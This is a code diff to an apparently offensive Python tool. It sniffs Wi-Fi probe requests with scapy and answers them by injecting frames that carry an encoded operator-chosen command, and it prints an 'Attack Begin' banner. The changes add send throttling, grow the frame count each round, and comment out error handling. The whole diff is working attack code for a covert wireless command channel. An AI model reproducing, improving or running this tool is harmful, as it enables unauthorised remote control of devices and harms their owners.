@@ -31,6 +31,7 @@ class Action1:
         self.ReceiveHash = None;
         self.SendHash = None;
         self.number = 0;
+        self.time = 0;
     def Handle(self,packet):
         dot = packet.getlayer(Dot11)
         if dot != None and dot.type == 0 and dot.subtype == 4:
@@ -43,11 +44,13 @@ class Action1:
                 if(self.SendHash == None):
                     self.SendHash = Tools.getTimeHash()
                 cmd_bin = Tools().CMDEncode(self.SendHash+SendCMD)
-                if(self.SendHash != self.ReceiveHash ):
-                    self.number += 1;
-                    print("Round ["+str(self.number)+"]  : Context is {"+cmd_bin+"}   "),
-                    response_frame = Tools.getPayloadFrame(cmd_bin, ct_addr2, '22:22:22:22:22:22')
-                    sendp(response_frame, iface="wlan0", count=500)
+                if(self.SendHash != self.ReceiveHash):
+                    if(time.time()-self.time>4):
+                        self.number += 1;
+                        print("Round ["+str(self.number)+"]  : Context is {"+cmd_bin+"}   "),
+                        response_frame = Tools.getPayloadFrame(cmd_bin, ct_addr2, '22:22:22:22:22:22')
+                        sendp(response_frame, iface="wlan0", count=450+50*self.number)
+                        self.time = time.time()
                 else:
                     self.SendHash = None;
                     self.number = 0;
@@ -59,7 +62,7 @@ SendCMD = ""
 opts, args = getopt.getopt(sys.argv[1:], "hc:")
 for op, value in opts:
     if op == "-c":
-        try:
+        #try:
             SendCMD += value
             for j in args:
                 SendCMD = SendCMD+" "+j
@@ -68,10 +71,10 @@ for op, value in opts:
             #print("You input command is :[" + SendCMD+"]")
             print("=====Attack Begin======")
             print("Sniff Monitor...")
-            sniff(iface="wlan0", prn=act1.Handle)
-        except:
+            sniff(iface="wlan0",prn=act1.Handle)
+        #except:
             #print("Please try again later")
-            pass
+            #pass
     elif op == "-h":
         print('''
         ----------------------------------
